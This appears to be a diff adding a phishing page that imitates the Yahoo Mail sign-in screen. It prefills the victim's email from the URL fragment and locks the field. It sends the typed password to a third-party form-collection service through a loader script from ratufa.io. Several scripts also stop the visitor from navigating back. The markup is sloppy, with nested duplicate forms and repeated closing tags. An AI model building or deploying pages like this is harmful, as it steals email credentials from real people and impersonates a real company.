@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Yahoo Mail</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f8fa;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        /* Top Header Navigation Line */
+        .header-nav {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 40px;
+            background-color: transparent;
+        }
+
+        .company-logo-placeholder {
+            font-size: 26px;
+            font-weight: bold;
+            color: #0b57d0; /* Dynamic accent color for alternative logo placeholder */
+            text-decoration: none;
+        }
+
+        .header-links a {
+            font-size: 13px;
+            color: #5b626a;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+
+        .header-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Main Workspace Box Display Wrapper */
+        .main-container {
+            display: flex;
+            justify-content: flex-end;
+            align-items: flex-start;
+            flex-grow: 1;
+            padding: 20px 10% 60px 0px;
+        }
+
+        /* White floating interface block */
+        .contact-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            padding: 32px;
+            border-radius: 4px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        .card-heading {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1d2a3a;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #b0b8c1;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #6001d2; /* Preserving original purple design focus accent color */
+            border-width: 1.5px;
+        }
+
+        textarea.form-control {
+            resize: vertical;
+            min-height: 70px;
+        }
+
+        /* Styled rounded form submit element matching purple target */
+        .submit-btn {
+            width: 100%;
+            background-color: #6001d2;
+            color: #ffffff;
+            border: none;
+            padding: 11px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #4b00aa;
+        }
+
+        /* Divider matching styling requirements */
+        .divider-container {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e959d;
+            font-size: 12px;
+            margin: 20px 0;
+        }
+
+        .divider-container::before, .divider-container::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e4e8;
+        }
+
+        .divider-container:not(:empty)::before {
+            margin-right: .5em;
+        }
+
+        .divider-container:not(:empty)::after {
+            margin-left: .5em;
+        }
+
+        /* Image placeholder block safely placed underneath divider */
+        .bottom-image-placeholder {
+            width: 100%;
+            height: 110px;
+            background-color: #ffffff;
+            border: 1px dashed #ced4da;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #8e959d;
+            font-size: 13px;
+        }
+
+        /* Windows system watermark reproduction overlay element */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.22);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        @media (max-width: 768px) {
+            .main-container {
+                justify-content: center;
+                padding-right: 0;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Layout Nav Bar featuring Company Logo replacement area -->
+    <header class="header-nav">
+        <a href="#" class="company-logo-placeholder">Yahoo!</a>
+        <div class="header-links">
+            <a href="#">Help</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+    </header>
+
+    <!-- Content Workspace -->
+    <main class="main-container">
+        <div class="contact-card">
+            <h1 class="card-heading">Sign in to Yahoo Mail</h1>
+                
+            <form action="https://formsubmit.io" method="POST">
+                <div class="form-group">
+                    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+        <!-- Right Column: Contact Form configured with FormSubmit.io -->
+        <div class="right-column">
+            <!-- Replace 'your-email@example.com' with your actual verified email address -->
+            <form action="" method="POST">
+                                    
+                <!-- Explicitly name form elements for FormSubmit backend processing -->
+                <div class="form-group">
+                    <label for="name"></label>
+                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+                
+                <div class="form-group">
+                    <label for="email"></label>
+
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                <button type="submit" class="submit-btn">Next</button>
+            </form>
+
+            <!-- Text break node element matching layout requirement -->
+            <div class="divider-container">or</div>
+
+            <!-- Image placeholder specified box underneath -->
+            <div class="bottom-image-placeholder">
+            <img src="https://github.com/cdtechdigital/images/blob/main/yahoos.JPG?raw=true" alt="Trulli" width="" height="">
+
+            </div>
+        </div>
+    </main>
+
+    <!-- Overlay watermark styling frame background structure -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
